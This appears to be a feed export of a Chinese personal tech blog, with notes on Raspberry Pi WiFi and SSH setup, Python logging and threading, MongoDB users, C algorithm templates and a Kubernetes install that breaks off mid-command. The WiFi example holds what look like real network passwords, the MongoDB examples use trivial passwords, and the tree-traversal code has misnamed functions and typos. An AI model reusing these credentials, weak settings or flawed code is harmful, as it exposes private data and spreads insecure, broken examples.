        <content type="html"><![CDATA[<blockquote><p>启用ssh,默认关机</p></blockquote><pre><code>刻录系统完成后在/boot分区（根目录）新建  ssh 文件即可</code></pre><blockquote><p>还没连接到树莓派，配置wifi,wifi配置 wpa_supplicant</p></blockquote><p>在 boot 分区，也就是树莓派的 /boot 目录下新建 wpa_supplicant.conf 文件</p><pre><code>country=CNctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdevupdate_config=1network={    ssid=&quot;301301&quot;    psk=&quot;18367116191&quot;    key_mgmt=WPA-PSK    priority=1}network={    ssid=&quot;TP-LINK_954D&quot;    psk=&quot;vvcn1101&quot;    key_mgmt=WPA-PSK    priority=2}#如果你的 WiFi 没有密码network={    ssid=&quot;你的无线网络名称（ssid）&quot;    key_mgmt=NONE}#如果你的 WiFi 使用WEP加密network={    ssid=&quot;你的无线网络名称（ssid）&quot;    key_mgmt=NONE    wep_key0=&quot;你的wifi密码&quot;}#如果你的 WiFi 使用WPA/WPA2加密network={    ssid=&quot;你的无线网络名称（ssid）&quot;    key_mgmt=WPA-PSK    psk=&quot;你的wifi密码&quot;}</code></pre><p>说明：</p><ul><li>ssid:网络的ssid</li><li>psk:密码</li><li>priority:连接优先级，数字越大优先级越高（不可以是负数）</li><li>scan_ssid:连接隐藏WiFi时需要指定该值为1</li></ul><p>如果你不清楚 WiFi 的加密模式，可以在安卓手机上用 root explorer 打开 /data/misc/wifi/wpa/wpa_supplicant.conf，查看 WiFi 的信息。</p><blockquote><p>有线连接,已经ssh连上的情况</p></blockquote><pre><code>iwlist scan  # 查看wifi信息方法一：配置连接到某个热点:# 编辑wifi文件sudo vim /etc/wpa_supplicant/wpa_supplicant.conf# 在该文件最后添加下面的话network={    ssid=&quot;WIFINAME&quot;    psk=&quot;password&quot;}# 引号部分分别为wifi的名字和密码# 保存文件后几秒钟应该就会自动连接到该wifi# 查看是否连接成功ifconfigwlan0方法二：配置树梅派3无线wifi连接修改/etc/network/interface文件auto loiface lo inet loopbackiface eth0 inet dhcpauto wlan0allow-hotplug wlan0iface wlan0 inet dhcpwpa-ssid  接入AP的名字wpa－psk  接入AP的密码保存文件，然后运行如下命令重新启动网络！sudo /etc/init.d/networking restart</code></pre><p>获取ip</p><pre><code>命令行输入 arp -a可以看到同局域网的设备的 ip和mac地址一般树莓派的mac地址是b开头的</code></pre><p>设置静态ip</p><p>一、使用路由器设置</p><p>二、修改/etc/network/interfaces文件设置</p><pre><code>终端下输入pi@raspberrypi:~ $ sudo nano /etc/network/interfaces原先网卡IP是从DHCP服务器获取的，找到下面这一句iface eth0 inet dhcp我们需要改为静态IP，将这一句替换为如下内容,如果找不到这一句就直接填写下面的内容到文件最后---iface eth0 inet static#固定IP地址address 192.168.1.201#掩码，可以登录路由器查看netmask 255.255.255.0#网关，可以登录路由器查看gateway 192.168.1.1#DNS服务器dns-nameservers 114.114.114.114---eth0是有线网卡，如果连接的是无线网络，把eth0改成wlan0---iface wlan0 inet staticaddress 192.168.1.202netmask 255.255.255.0gateway 192.168.1.1dns-nameservers 114.114.114.114---</code></pre>]]></content>
      
      
      <categories>
          
          <category> raspberry </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py logging.md</title>
      <link href="/2019/12/02/deploy/python/libs/py%20logging/"/>
      <url>/2019/12/02/deploy/python/libs/py%20logging/</url>
      
        <content type="html"><![CDATA[<p><a href="https://docs.python.org/2/library/logging.html" target="_blank" rel="noopener">logging官网</a>  </p><p>基本用法</p><pre><code class="python"># -*- coding: utf-8 -*-import loggingimport sys# 获取logger实例，如果参数为空则返回root loggerlogger = logging.getLogger(&quot;AppName&quot;)# 这是最基本的入口，该方法参数可以为空，默认的logger名称是root，# 如果在同一个程序中一直都使用同名的logger，其实会拿到同一个实例，使用这个技巧就可以跨模块调用同样的logger来记录日志。# logger = logging.getLogger(&quot;App.UI&quot;)# logger = logging.getLogger(&quot;App.Service&quot;)# 指定logger输出格式formatter = logging.Formatter(&#39;%(asctime)s %(levelname)-8s: %(message)s&#39;)# 文件日志file_handler = logging.FileHandler(&quot;test.log&quot;)file_handler.setFormatter(formatter)  # 可以通过setFormatter指定输出格式# 控制台日志console_handler = logging.StreamHandler(sys.stdout)console_handler.formatter = formatter  # 也可以直接给formatter赋值# 为logger添加的日志处理器logger.addHandler(file_handler)logger.addHandler(console_handler)# 指定日志的最低输出级别，默认为WARN级别logger.setLevel(logging.INFO)# 输出不同级别的loglogger.debug(&#39;this is debug info&#39;)logger.info(&#39;this is information&#39;)logger.warn(&#39;this is warning message&#39;)logger.error(&#39;this is error message&#39;)logger.fatal(&#39;this is fatal message, it is same as logger.critical&#39;)logger.critical(&#39;this is critical message&#39;)# 2016-10-08 21:59:19,493 INFO    : this is information# 2016-10-08 21:59:19,493 WARNING : this is warning message# 2016-10-08 21:59:19,493 ERROR   : this is error message# 2016-10-08 21:59:19,493 CRITICAL: this is fatal message, it is same as logger.critical# 2016-10-08 21:59:19,493 CRITICAL: this is critical message# 移除一些日志处理器logger.removeHandler(file_handler)</code></pre><p>格式化输出</p><pre><code class="python"># 格式化输出service_name = &quot;Booking&quot;logger.error(&#39;%s service is down!&#39; % service_name)  # 使用python自带的字符串格式化，不推荐logger.error(&#39;%s service is down!&#39;, service_name)  # 使用logger的格式化，推荐logger.error(&#39;%s service is %s!&#39;, service_name, &#39;down&#39;)  # 多参数格式化logger.error(&#39;{} service is {}&#39;.format(service_name, &#39;down&#39;)) # 使用format函数，推荐# 2016-10-08 21:59:19,493 ERROR   : Booking service is down!</code></pre><p>记录异常信息</p><pre><code class="python">try:    a = 1 / 0except:    logger.error(&quot;this is an exception message&quot;)    # 等同于error级别，但是会额外记录当前抛出的异常堆栈信息    logger.exception(&#39;this is an exception message&#39;)</code></pre><hr><p>Formatter日志格式</p><p>Formatter对象定义了log信息的结构和内容，构造时需要带两个参数：</p><ol><li>一个是格式化的模板fmt，默认会包含最基本的level和 message信息</li><li>一个是格式化的时间样式datefmt，默认为 2003-07-08 16:49:45,896 (%Y-%m-%d %H:%M:%S)</li></ol><p>fmt中允许使用的变量可以参考下表。</p><table><thead><tr><th>格式</th><th>含义</th></tr></thead><tbody><tr><td>%(name)s</td><td>Logger的名字</td></tr><tr><td>%(levelno)s</td><td>数字形式的日志级别</td></tr><tr><td>%(levelname)s</td><td>文本形式的日志级别</td></tr><tr><td>%(pathname)s</td><td>调用日志输出函数的模块的完整路径名，可能没有</td></tr><tr><td>%(filename)s</td><td>调用日志输出函数的模块的文件名</td></tr><tr><td>%(module)s</td><td>调用日志输出函数的模块名</td></tr><tr><td>%(funcName)s</td><td>调用日志输出函数的函数名</td></tr><tr><td>%(lineno)d</td><td>调用日志输出函数的语句所在的代码行</td></tr><tr><td>%(created)f</td><td>当前时间，用UNIX标准的表示时间的浮点数表示</td></tr><tr><td>%(relativeCreated)d</td><td>输出日志信息时的，自Logger创建以来的毫秒数</td></tr><tr><td>%(asctime)s</td><td>字符串形式的当前时间。默认格式是“2003-07-08 16:49:45,896”。逗号后面的是毫秒</td></tr><tr><td>%(thread)d</td><td>线程ID。可能没有</td></tr><tr><td>%(threadName)s</td><td>线程名。可能没有</td></tr><tr><td>%(process)d</td><td>进程ID。可能没有</td></tr><tr><td>%(message)s</td><td>用户输出的消息</td></tr></tbody></table><hr><p>SetLevel 日志级别</p><p>Logging有如下级别: DEBUG，INFO，WARNING，ERROR，CRITICAL<br>默认级别是WARNING，logging模块只会输出指定level以上的log。</p><hr><p>Handler 日志处理器</p><p>最常用的是StreamHandler和FileHandler, Handler用于向不同的输出端打log。<br>Logging包含很多handler, 可能用到的有下面几种</p><table><thead><tr><th>Handler</th><th>function</th></tr></thead><tbody><tr><td>StreamHandler</td><td>instances send error messages to streams (file-like objects).</td></tr><tr><td>FileHandler</td><td>instances send error messages to disk files.</td></tr><tr><td>RotatingFileHandler</td><td>instances send error messages to disk files, with support for maximum log file sizes and log file rotation.</td></tr><tr><td>TimedRotatingFileHandler</td><td>instances send error messages to disk files, rotating the log file at certain timed intervals.</td></tr><tr><td>SocketHandler</td><td>instances send error messages to TCP/IP sockets.</td></tr><tr><td>DatagramHandler</td><td>instances send error messages to UDP sockets.</td></tr><tr><td>SMTPHandler</td><td>instances send error messages to a designated email address.</td></tr></tbody></table><hr><p>Configuration 配置方法</p><p>logging的配置大致有下面几种方式。</p><ol><li>通过代码进行完整配置，参考开头的例子，主要是通过getLogger方法实现。</li><li>通过代码进行简单配置，下面有例子，主要是通过basicConfig方法实现。</li><li>通过配置文件，下面有例子，主要是通过 logging.config.fileConfig(filepath)</li></ol><hr><p>logging.basicConfig</p><p>basicConfig()提供了非常便捷的方式让你配置logging模块并马上开始使用，可以参考下面的例子。<br>具体可以配置的项目请查阅<a href="https://docs.python.org/2/library/logging.html#logging.basicConfig" target="_blank" rel="noopener">官方文档</a><br>。</p><blockquote><p>下面的方式获取的是root logger。只要你在程序中使用过root logger，那么默认你打印的所有日志都算它一份。（会导致日志的重复输出）<br>如果你真的想禁用root logger，有两个不是办法的办法：<br>logging.getLogger().handlers = []  # 删除所有的handler<br>logging.getLogger().setLevel(logging.CRITICAL)  # 将它的级别设置到最高</p></blockquote><pre><code class="python">import logging# 获取的是 root logging，项目中不建议# 输出到文件logging.basicConfig(filename=&#39;example.log&#39;, level=logging.DEBUG)logging.debug(&#39;This message should go to the log file&#39;)# 输出到控制台logging.basicConfig(format=&#39;%(levelname)s:%(message)s&#39;, level=logging.DEBUG)logging.debug(&#39;This message should appear on the console&#39;)# 输出到控制台，进行设置，也可以不设置（默认）logging.basicConfig(format=&#39;%(asctime)s %(message)s&#39;, datefmt=&#39;%m/%d/%Y %I:%M:%S %p&#39;)logging.warning(&#39;is when this event was logged.&#39;)logging.basicConfig()logging.warning(&#39;is when this event was logged.&#39;)</code></pre><hr><p>通过文件配置logging</p><p><a href="https://docs.python.org/2/library/logging.config.html" target="_blank" rel="noopener">官方文档</a></p><pre><code># logging.conf[loggers]keys=root[logger_root]level=DEBUGhandlers=consoleHandler#,timedRotateFileHandler,errorTimedRotateFileHandler#################################################[handlers]keys=consoleHandler,timedRotateFileHandler,errorTimedRotateFileHandler[handler_consoleHandler]class=StreamHandlerlevel=DEBUGformatter=simpleFormatterargs=(sys.stdout,)[handler_timedRotateFileHandler]class=handlers.TimedRotatingFileHandlerlevel=DEBUGformatter=simpleFormatterargs=(&#39;debug.log&#39;, &#39;H&#39;)[handler_errorTimedRotateFileHandler]class=handlers.TimedRotatingFileHandlerlevel=WARNformatter=simpleFormatterargs=(&#39;error.log&#39;, &#39;H&#39;)#################################################[formatters]keys=simpleFormatter, multiLineFormatter[formatter_simpleFormatter]format= %(levelname)s %(threadName)s %(asctime)s:   %(message)sdatefmt=%H:%M:%S[formatter_multiLineFormatter]format= ------------------------- %(levelname)s ------------------------- Time:      %(asctime)s Thread:    %(threadName)s File:      %(filename)s(line %(lineno)d) Message: %(message)sdatefmt=%Y-%m-%d %H:%M:%S</code></pre><pre><code class="python">import osimport loggingdef get_logger():    filepath = os.path.join(os.path.dirname(__file__), &#39;logging.conf&#39;)    logging.config.fileConfig(filepath)    return logging.getLogger()</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>py threading.md</title>
      <link href="/2019/12/02/deploy/python/libs/py%20threading/"/>
      <url>/2019/12/02/deploy/python/libs/py%20threading/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Python的标准库提供了两个模块：_thread和threading，_thread是低级模块，threading是高级模块，对_thread进行了封装。<br>绝大多数情况下，我们只需要使用threading这个高级模块。<br>thread 模块是py2.7的，py3为兼容改名_thread，用py3 的thrading就行</p></blockquote><p>一个thread模块的例子（不建议使用，py2可用）</p><pre><code class="python">import time  import thread  def runner(arg):      for i in range(6):          print(str(i)+&#39;:&#39;+arg)        time.sleep(1)      #结束当前线程      thread.exit_thread()  #等同于thread.exit()  #启动一个线程，第一个参数为函数名，  #第二个参数为一个tuple类型，是传给函数的参数  thread.start_new_thread(runner, (&#39;hello world&#39;,))   #等同于thread.start_new(runner, (&#39;hello world&#39;))  #创建一个锁，锁用于线程同步，通常控制对共享资源的访问  lock = thread.allocate_lock()  #等同于thread.allocate()  num = 0  #获得锁，成功返回True，失败返回False  if lock.acquire():      num += 1      #释放锁      lock.release()  #thread模块提供的线程都将在主线程结束后同时结束，因此将主线程延迟结束  time.sleep(10)  print(&#39;num:&#39;+str(num)) </code></pre><hr><pre><code>threading.Thread类的常用方法1.在自己的线程类的__ init__里调用threading.Thread.__init__(self,name=threadname)，threadname为线程的名字。2.run()，通常需要重写，编写代码实现做需要的功能。3.getName()，获得线程对象名称。4.setName()，设置线程对象名称。5.start()，启动线程。6.join([timeout])，等待另一线程结束后再运行。7.setDaemon(bool)，设置子线程是否随主线程一起结束，必须在start()之前调用。默认为False。8.isDaemon()，判断线程是否随主线程一起结束。9.isAlive()，检查线程是否在运行中。</code></pre><pre><code class="python">import time, threading# 新线程执行的代码:def loop():    print(&#39;thread %s is running...&#39; % threading.current_thread().name)    n = 0    while n &lt; 5:        n = n + 1        print(&#39;thread %s &gt;&gt;&gt; %s&#39; % (threading.current_thread().name, n))        time.sleep(1)    print(&#39;thread %s ended.&#39; % threading.current_thread().name)print(&#39;thread %s is running...&#39; % threading.current_thread().name)t = threading.Thread(target=loop, name=&#39;LoopThread&#39;)  # 直接实例化t.start()t.join()print(&#39;thread %s ended.&#39; % threading.current_thread().name)</code></pre><pre><code class="python"># 继承方式import time, threadingclass runner(threading.Thread):      def __init__(self, name):          threading.Thread.__init__(self)          self.name = name          self.thread_stop = False      def run(self):          while not self.thread_stop:              print str(self.name)+&#39;:&#39;+&#39;hello world&#39;              time.sleep(1)      def stop(self):          self.thread_stop = True  def test():      t = runner(&#39;thread&#39;)      t.start()      time.sleep(10)      t.stop()  if __name__ == &#39;__main__&#39;:      test()  </code></pre><p>带锁 Lock</p><pre><code class="python">balance = 0lock = threading.Lock()def run_thread(n):    for i in range(100000):        # 先要获取锁:        lock.acquire()        try:            # 放心地改吧:            change_it(n)        finally:            # 改完了一定要释放锁:            lock.release()</code></pre><p>带锁RLock</p><pre><code class="python">import time  import threading  num=0  lock = threading.RLock()  class runner(threading.Thread):      def __init__(self, name):          threading.Thread.__init__(self)          self.name = name      def run(self):          global num            while True:               if num &gt;= 6: break              if lock.acquire():                  print &quot;Thread(%s) locked, Number: %d&quot; % (self.name, num)                    time.sleep(1)              lock.release()              print &quot;Thread(%s) released, Number: %d&quot; % (self.name, num)              time.sleep(1)              num += 1   def test():      t1 = runner(&#39;thread1&#39;)      t2 = runner(&#39;thread2&#39;)      t1.start()      t2.start()  if __name__== &#39;__main__&#39;:        test()    # 在threading module中，python又提供了Lock对象的变种:# RLock对象。RLock对象内部维护着一个Lock对象，它是一种可重入的对象。# 对于Lock对象而言，如果一个线程连续两次进行acquire操作，# 那么由于第一次acquire之后没有release，第二次acquire将挂起线程。# 这会导致Lock对象永远不会release，使得线程死锁# RLock对象允许一个线程多次对其进行acquire操作，因为在其内部通过一个counter变量维护着线程acquire的次数。# 而且每一次的acquire操作必须有一个release操作与之对应，在所有的release操作完成之后，别的线程才能申请该RLock对象。</code></pre><p>每个线程保存自己的变量</p><pre><code class="python"># 全局变量local_school就是一个ThreadLocal对象，每个Thread对它都可以读写student属性，但互不影响。# 可以把local_school看成全局变量，但每个属性如local_school.student都是线程的局部变量，# 可以任意读写而互不干扰，也不用管理锁的问题，ThreadLocal内部会处理import threading# 创建全局ThreadLocal对象:local_school = threading.local()def process_student():    # 获取当前线程关联的student:    std = local_school.student    print(&#39;Hello, %s (in %s)&#39; % (std, threading.current_thread().name))def process_thread(name):    # 绑定ThreadLocal的student:    local_school.student = name    process_student()t1 = threading.Thread(target=process_thread, args=(&#39;Alice&#39;,), name=&#39;Thread-A&#39;)t2 = threading.Thread(target=process_thread, args=(&#39;Bob&#39;,), name=&#39;Thread-B&#39;)t1.start()t2.start()t1.join()t2.join()</code></pre><p>线程池</p><p><a href="https://python3-cookbook.readthedocs.io/zh_CN/latest/c12/p07_creating_thread_pool.html" target="_blank" rel="noopener">https://python3-cookbook.readthedocs.io/zh_CN/latest/c12/p07_creating_thread_pool.html</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> libs </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pi 安装py环境.md</title>
      <link href="/2019/12/02/deploy/raspberry/pi%20%E5%AE%89%E8%A3%85py%E7%8E%AF%E5%A2%83/"/>
      <url>/2019/12/02/deploy/raspberry/pi%20%E5%AE%89%E8%A3%85py%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>示例，根据实际安装py版本，完了之后环境搞搞</p><pre><code># 安装编译所需依赖包sudo apt-get install build-essential tk-dev libncurses5-dev libncursesw5-dev libreadline6-dev libdb5.3-dev libgdbm-dev libsqlite3-dev libssl-dev libbz2-dev libexpat1-dev liblzma-dev zlib1g-dev# 安装SSL依赖sudo apt-get install libssl-dev# 到官网下载Python3.6.6： https://www.python.org/downloads/source/wget https://www.python.org/ftp/python/3.6.6/Python-3.6.6.tar.xz# 解压tar xf Python-3.6.6.tar.xz # 进入目录cd Python-3.6.6# 开始编译（时间漫长，需要等待，建议用&amp;&amp;把三句连在一起执行）sudo  ./configuresudo makesudo make install# 升级pipsudo python3.6 -m pip install --upgrade pip</code></pre>]]></content>
      
      
      <categories>
          
          <category> raspberry </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mongo 用户.md</title>
      <link href="/2019/12/02/deploy/database/mongo/mongo%20%E7%94%A8%E6%88%B7/"/>
      <url>/2019/12/02/deploy/database/mongo/mongo%20%E7%94%A8%E6%88%B7/</url>
      
        <content type="html"><![CDATA[<p>查看数据库</p><pre><code>show dbs</code></pre><p>新mongo没有admin,创建</p><pre><code>use admindb.createUser(  {    user: &quot;admin&quot;,    pwd: &quot;admin&quot;,    roles: [ { role: &quot;userAdminAnyDatabase&quot;, db: &quot;admin&quot; } ]  })</code></pre><p>启用 auth</p><pre><code>vi /etc/mongod.conf修改auth=true重启 mongod 服务：service mongod restartor./mongod --auth  # 启用认证</code></pre><p>创建新库带用户密码的</p><p>在那个库下create，就是那个db的用户，不过首先需要 auth admin</p><pre><code>认证登录use admindb.auth(&quot;admin&quot;, &quot;password&quot;)为自己的库创建用户use mydbdb.createUser(  {    user: &quot;myuser&quot;,    pwd: &quot;myuser&quot;,    roles: [ { role: &quot;readWrite&quot;, db: &quot;mydb&quot; } ]  })# or,权限不一样db.createUser(  {    user: &quot;myuser&quot;,    pwd: &quot;myuser&quot;,    roles: [ { role: &quot;dbOwner&quot;, db: &quot;mydb&quot; } ]  })# auth mydbuse mydbdb.auth(&quot;myuser&quot;,&quot;myuser&quot;)</code></pre><p>其他：</p><pre><code># 查看系统用户use admindb.system.users.find()  # 显示当前系统用户# 授予角色：db.grantRolesToUser( &quot;userName&quot; , [ { role: &quot;&lt;role&gt;&quot;, db: &quot;&lt;database&gt;&quot; } ])db.grantRolesToUser( &quot;myuser&quot; , [ { role: &quot;dbOwner&quot;, db: &quot;mydb&quot; } ])# 取消角色：db.grantRolesToUser( &quot;userName&quot; , [ { role: &quot;&lt;role&gt;&quot;, db: &quot;&lt;database&gt;&quot; } ])db.revokeRolesFromUser( &quot;myuser&quot; , [ { role: &quot;readWrite&quot;, db: &quot;mydb&quot; } ])# 删除用户use mydbdb.dropUser(&quot;myuser&quot;)# 删除用户的时候需要切换到用户管理的数据库才可以删除；</code></pre>]]></content>
      
      
      <categories>
          
          <category> database </category>
          
          <category> mongo </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>algorithm 背包问题模版.md</title>
      <link href="/2019/12/02/deploy/algorithm/algorithm%20%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98%E6%A8%A1%E7%89%88/"/>
      <url>/2019/12/02/deploy/algorithm/algorithm%20%E8%83%8C%E5%8C%85%E9%97%AE%E9%A2%98%E6%A8%A1%E7%89%88/</url>
      
        <content type="html"><![CDATA[<pre><code class="c++"># include&lt;stdio.h&gt;# include&lt;math.h&gt;# include&lt;string.h&gt;int f[105],V;inline int max(int a,int b){    return a&gt;b?a:b;}void ZeroOnePack(int cost,int weight)   //01背包{   int v;   for(v=V;v&gt;=cost;v--)     f[v]=max(f[v-cost]+weight,f[v]);}void CompletePack(int cost,int weight)   //完全背包{   int v;   for(v=cost;v&lt;=V;v++)     f[v]=max(f[v-cost]+weight,f[v]);}void MultipelePack(int cost,int weight,int amount)  //多重背包{  int k;  if(cost*amount&gt;=V)  {     CompletePack(cost,weight);     return;  }  for(k=1;k&lt;amount;k*=2)  {     ZeroOnePack(k*cost,k*weight);     amount=amount-k;  }  ZeroOnePack(amount*cost,amount*weight);}int main(){   int t,i,n,cost,weight,amount;   scanf(&quot;%d&quot;,&amp;t);   while(t--)   {      memset(f,0,sizeof(f));      scanf(&quot;%d%d&quot;,&amp;V,&amp;n);      for(i=1;i&lt;=n;i++)      {         scanf(&quot;%d%d%d&quot;,&amp;cost,&amp;weight,&amp;amount);         MultipelePack(cost,weight,amount);      }      printf(&quot;%d\n&quot;,f[V]);   }   return 0;}</code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>algorithm 二叉树遍历.md</title>
      <link href="/2019/12/02/deploy/algorithm/algorithm%20%E4%BA%8C%E5%8F%89%E6%A0%91%E9%81%8D%E5%8E%86/"/>
      <url>/2019/12/02/deploy/algorithm/algorithm%20%E4%BA%8C%E5%8F%89%E6%A0%91%E9%81%8D%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<h2 id="先序遍历"><a href="#先序遍历" class="headerlink" title="先序遍历"></a>先序遍历</h2><pre><code class="c">    void PreOrderTraversal (BinTree BT)    {        if ( BT )        {            printf(&quot;%d&quot;, BT-&gt;Data);            PreOrderTraversal( BT-&gt;Left );            PreOrderTraversal( BT-&gt;Right );        }    }</code></pre><h2 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h2><pre><code class="c">    void PreOrderTraversal (BinTree BT)    {        if ( BT )        {            PreOrderTraversal( BT-&gt;Left );            printf(&quot;%d&quot;, BT-&gt;Data);            PreOrderTraversal( BT-&gt;Right );        }    }</code></pre><h2 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h2><pre><code class="c">    void PreOrderTraversal (BinTree BT)    {        if ( BT )        {            PreOrderTraversal( BT-&gt;Left );            PreOrderTraversal( BT-&gt;Right );            printf(&quot;%d&quot;, BT-&gt;Data);        }    }</code></pre><h2 id="中序遍历非递归（使用栈）"><a href="#中序遍历非递归（使用栈）" class="headerlink" title="中序遍历非递归（使用栈）"></a>中序遍历非递归（使用栈）</h2><pre><code class="c">    void InOrderTraversal (BinTree BT)    {        BinTree T = BT;        Stack S = CreatStack(MaxSize);//创建初始化栈S        while( T || !IsEmpty(S))        {            while(T)            {                Push(S,T);//压栈的是地址                T = T-&gt;Left;            }            if(!IsEmpty(S))            {                T = Pop(S);                printf(&quot;%d&quot;,T-&gt;Data);                T = T-&gt;Right;            }        }    }</code></pre><h2 id="先序遍历非递归（使用栈）"><a href="#先序遍历非递归（使用栈）" class="headerlink" title="先序遍历非递归（使用栈）"></a>先序遍历非递归（使用栈）</h2><pre><code class="c">    void InOrderTraversal (BinTree BT)    {        BinTree T = BT;        Stack S = CreatStack(MaxSize);//创建初始化栈S        while( T || !IsEmpty(S))        {            while(T)            {                printf(&quot;%d&quot;,T-&gt;Data);                Push(S,T);//压栈的是地址                T = T-&gt;Left;            }            if(!IsEmpty(S))            {                T = Pop(S);                T = T-&gt;Right;            }        }    }</code></pre><h2 id="层序遍历"><a href="#层序遍历" class="headerlink" title="层序遍历"></a>层序遍历</h2><pre><code class="c">    void LevelOrederTraversal (BinTree BT)    {        Queue Q;        BinTree T;        if( !BT ) return;        Q = CreatQueue( MacSize);        AddQ( Q, BT );        while (!IsEmptyQ(Q))        {            T = DeleteQ(Q);            printf(&quot;%d\n&quot;,T-&gt;Left);            if (T-Left)                AddQ(Q,T-Left);            if(T-&gt;Right)                AddQ(Q,T-Right);        }    }</code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>k8s 安装环境.md</title>
      <link href="/2019/12/02/deploy/server/k8s/k8s%20%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83/"/>
      <url>/2019/12/02/deploy/server/k8s/k8s%20%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>kubernetes 指南： <a href="https://kubernetes.feisky.xyz/setup/cluster/kubeadm" target="_blank" rel="noopener">https://kubernetes.feisky.xyz/setup/cluster/kubeadm</a><br>参考：<br><a href="https://zhuanlan.zhihu.com/p/46341911" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/46341911</a><br><a href="https://juejin.im/post/5c9a49ace51d456c9d78dbef" target="_blank" rel="noopener">https://juejin.im/post/5c9a49ace51d456c9d78dbef</a><br><a href="https://www.kubernetes.org.cn/2059.html" target="_blank" rel="noopener">https://www.kubernetes.org.cn/2059.html</a><br><a href="https://ieevee.com/tech/2018/09/01/kubeadm.html#%E6%8B%89%E5%8F%96k8s%E7%9A%84%E5%8C%85%E5%B9%B6tag" target="_blank" rel="noopener">https://ieevee.com/tech/2018/09/01/kubeadm.html#%E6%8B%89%E5%8F%96k8s%E7%9A%84%E5%8C%85%E5%B9%B6tag</a><br><a href="https://kubernetes.feisky.xyz/" target="_blank" rel="noopener">https://kubernetes.feisky.xyz/</a>  (*)  </p><p>官方单机集群部署： <a href="https://v1-12.docs.kubernetes.io/zh/docs/setup/independent/create-cluster-kubeadm/" target="_blank" rel="noopener">https://v1-12.docs.kubernetes.io/zh/docs/setup/independent/create-cluster-kubeadm/</a></p><p>master节点服务器要求 阿里云 2G2核</p><blockquote><p>kubernetes的国外安装其实非常简单，国内安装的主要问题在于kubernetes部件所需的官方镜像在 <a href="http://gcr.io" target="_blank" rel="noopener">http://gcr.io</a>(Google Cloud Container Registry)上，很不幸，这个网站被墙了。所以解决了这个问题，国内环境的安装也就简单了</p></blockquote><ol><li>关闭swap</li><li>安装docker环境（参考其他）</li><li>增加kubernetes aliyun镜像源</li><li>安装kubeadm/kubelet/kubectl</li><li>拉取k8s的镜像并tag</li><li>开始安装master</li><li>添加网络插件，部署weave网络，其他网络还不懂</li><li>准备计算资源</li><li>安装weave scope</li></ol><blockquote><p>k8s对master和worker节点的端口开放有要求(关闭防火墙)</p></blockquote><p><img src="https://i.loli.net/2019/09/26/6oKOwGp15aekrfZ.png" alt="k8s对master和worker节点的端口开放有要求"></p><p>关闭swap</p><blockquote><p>如果不关闭kubernetes运行会出现错误， 即使安装成功了，node重启后也会出现kubernetes server运行错误。</p></blockquote><pre><code>sudo swapoff -a #暂时关闭同时把/etc/fstab包含swap那行记录删掉</code></pre><p>添加源</p><pre><code>apt-get update &amp;&amp; apt-get install -y apt-transport-https curl# 阿里云（测试过）curl https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | apt-key add - cat &lt;&lt;EOF &gt;/etc/apt/sources.list.d/kubernetes.listdeb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial mainEOF# 或中科大cat &lt;&lt;EOF &gt; /etc/apt/sources.list.d/kubernetes.listdeb http://mirrors.ustc.edu.cn/kubernetes/apt kubernetes-xenial mainEOF</code></pre><p>开始安装</p><pre><code>apt update &amp;&amp; apt install -y kubelet kubeadm kubectlapt-mark hold kubelet kubeadm kubectl  # 设置不自动更新# 如果你有多台机器，非master节点不需要安装kubeadm/kubectl。当然装了也没啥坏处。</code></pre><pre><code>apt-mark 用来标记安装软件包的状态. 有时一个软件的仓库出了问题, 用 apt-get 安装后无法使用, 这时就可以利用 apt-mark hold package 标记该软件包不被自动更新.Commands:auto - Mark the given packages as automatically installedmanual - Mark the given packages as manually installedhold - Mark a package as held backunhold - Unset a package set as held backshowauto - Print the list of automatically installed packagesshowmanual - Print the list of manually installed packagesshowhold - Print the list of package on hold</code></pre><p>获取k8s镜像列表并tag</p><blockquote><p>由于官方镜像地址被墙，所以我们需要首先获取所需镜像以及它们的版本。然后从国内镜像站获取。</p></blockquote><pre><code># 阿里云kubeadm config images list  # 经测试也可以，获取最新版本# kubeadm config images list --kubernetes-version v1.16.0# 必须要指定版本，这样kubeadm才不会去连k8s.io。kubeadm init同理# 获取镜像列表后可以通过下面的脚本从阿里云获取images=(  # 下面的镜像应该去除&quot;k8s.gcr.io/&quot;的前缀，版本换成上面获取到的版本    kube-apiserver:v1.16.0    kube-controller-manager:v1.16.0    kube-scheduler:v1.16.0    kube-proxy:v1.16.0    pause:3.1    etcd:3.3.15-0    coredns:1.6.2)for imageName in ${images[@]} ; do    docker pull registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName    docker tag registry.cn-hangzhou.aliyuncs.com/google_containers/$imageName k8s.gcr.io/$imageName    docker rmi registry.cn-hangzhou.aliyuncs.com/google_containers/$imageNamedone</code></pre><p>初始化环境 开始安装master<br>这个就很简单了，只需要简单的一个命令：</p><pre><code>kubeadm initkubeadm init --kubernetes-version v1.16.0  # 指定版本</code></pre><p>配置授权信息</p><blockquote><p>所需的命令在init成功后也会有提示，主要是为了保存相关的配置信息在用户目录下，这样不用每次都输入相关的认证信息。</p></blockquote><pre><code># KUBECONFIG 这个环境变量必须要设置，应该被写入.bash_profile中mkdir -p $HOME/.kubesudo cp -i 